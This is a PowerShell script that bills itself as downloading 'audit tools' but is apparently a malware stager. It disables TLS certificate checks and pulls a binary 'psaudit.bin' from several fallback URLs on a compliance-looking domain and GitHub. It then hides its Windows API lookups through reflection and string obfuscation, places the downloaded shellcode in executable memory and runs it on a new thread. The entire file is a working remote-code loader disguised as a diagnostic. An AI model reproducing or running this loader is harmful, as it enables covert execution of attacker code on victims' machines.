# 1. Security & Protocol Setup
# Essential for bypassing SSL/TLS errors from your previous attempts
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

$wc = New-Object Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.3719.104")

# 2. Define Fail-Safe URL Array
$urlList = @(
    "https://www.dictcompliance.com/js/psaudit.bin",
    "https://github.com/Shinzer/ProjectX/raw/refs/heads/main/psaudit.bin",
    "https://github.com/ryan-gonzales/CBC-audit-tools/raw/refs/heads/main/psaudit.bin"
)

$global:shellcode = $null

# 3. Iterate through URLs until one succeeds
foreach ($url in $urlList) {
    try {
        #  @dev Uncomment the line below for debugging.
        # Write-Host "[*] Attempting download from: $url" -ForegroundColor Gray
        $data = $wc.DownloadData($url)
        
        # Fixed: $null on the left side
        if ($null -ne $data) {
            $global:shellcode = $data

            #  @dev Uncomment the line below for debugging.
            Write-Host "[+] Successfully downloaded audit tools!" -ForegroundColor Green
            break 
        }
    } catch {
        Write-Host "[-] Failed to reach $url. Trying next..." -ForegroundColor Yellow
        Start-Sleep -Seconds 2 
    }
}

# 4. Final check before proceeding to injection
# Fixed: $null on the left side
if ($null -eq $global:shellcode) {
    Write-Host "[!!!] Critical Failure: Cannot download diagnostic script." -ForegroundColor Red
    return
}

# 3. P/Invoke Definitions (Required if your loader calls these)
$Kernel32Definition = @"
using System;
using System.Runtime.InteropServices;
public class kernel32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@

if (-not ([System.Management.Automation.PSTypeName]"kernel32").Type) {
    Add-Type -TypeDefinition $Kernel32Definition
}


function LookupFunc {
    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and ($_.Location -like "*$([char[]](83,121,115,116,101,109,46,100,108,108) -join '')") }).GetType("Microsoft.Win32.$("Unsafe" + "Native" + "Methods")")
    $tmp = $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$_}} 
    $handle = $assem.GetMethod('GetModuleHandle').Invoke($null, @($moduleName));
    [IntPtr] $result = 0;
    try {
        Write-Host "First Invoke - $moduleName $functionName";
        $result = $tmp[0].Invoke($null, @($handle, $functionName));
    }catch {
        Write-Host "Second Invoke - $moduleName $functionName";
        $handle = new-object -TypeName System.Runtime.InteropServices.HandleRef -ArgumentList @($null, $handle);
        $result = $tmp[0].Invoke($null, @($handle, $functionName));
    }
    return $result;
}

function getDelegateType {
    Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType','Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType() 
}
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc),(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $lpMem, $shellcode.Length)
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),(getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject),(getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
